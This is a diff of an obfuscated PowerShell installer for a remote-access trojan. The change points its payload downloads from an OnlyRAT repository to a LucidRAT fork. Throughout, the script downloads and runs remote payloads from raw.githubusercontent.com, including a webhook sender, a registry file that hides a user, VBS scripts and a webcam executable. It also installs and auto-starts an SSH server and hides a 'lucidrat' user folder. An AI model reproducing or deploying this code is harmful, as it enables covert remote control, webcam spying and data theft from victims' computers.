@@ -43,7 +43,7 @@ Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP
 Add-Content -Path $CRYnrkaDbe -Value $env:temp
 Add-Content -Path $CRYnrkaDbe -Value $NyZnoLKCIs
 $VquGXMYQWi = RpLGWiUsIy
-Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/send-to-webhook.cmd -OutFile "$VquGXMYQWi.cmd"
+Invoke-WebRequest -Uri raw.githubusercontent.com/Lucidif3r/LucidRAT/main/payloads/send-to-webhook.cmd -OutFile "$VquGXMYQWi.cmd"
 Invoke-Expression "./$VquGXMYQWi.cmd $PEBgxuJUfd"
 mkdir $qsQBioVOkY
 Set-Location $qsQBioVOkY
@@ -51,15 +51,15 @@ Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 $irlpLDVsMf = RpLGWiUsIy
-Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/hide-user.reg -OutFile "$irlpLDVsMf.reg"
+Invoke-WebRequest -Uri raw.githubusercontent.com/Lucidif3r/LucidRAT/main/payloads/hide-user.reg -OutFile "$irlpLDVsMf.reg"
 $gdOjqHVNDKeg = RpLGWiUsIy
-Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/confirm-reg.vbs -OutFile "$gdOjqHVNDKeg.vbs"
+Invoke-WebRequest -Uri raw.githubusercontent.com/Lucidif3r/LucidRAT/main/payloads/confirm-reg.vbs -OutFile "$gdOjqHVNDKeg.vbs"
 Invoke-Expression "./$irlpLDVsMf.reg"; Invoke-Expression "./$gdOjqHVNDKeg.vbs"
 mkdir $env:temp/bNOEXCxyVp
 Set-Location $env:temp/bNOEXCxyVp
-Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/webcam.exe -OutFile "UaAIVKpYhR.exe"
+Invoke-WebRequest -Uri raw.githubusercontent.com/Lucidif3r/LucidRAT/main/payloads/webcam.exe -OutFile "UaAIVKpYhR.exe"
 $grOzVTtUmS = RpLGWiUsIy
-Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/confirm-cam.vbs -OutFile "$grOzVTtUmS.vbs"
+Invoke-WebRequest -Uri raw.githubusercontent.com/Lucidif3r/LucidRAT/main/payloads/confirm-cam.vbs -OutFile "$grOzVTtUmS.vbs"
 ./UaAIVKpYhR.exe; Invoke-Expression "./$grOzVTtUmS.vbs"
 Set-Location C:\Users
 attrib +h +s +r lucidrat
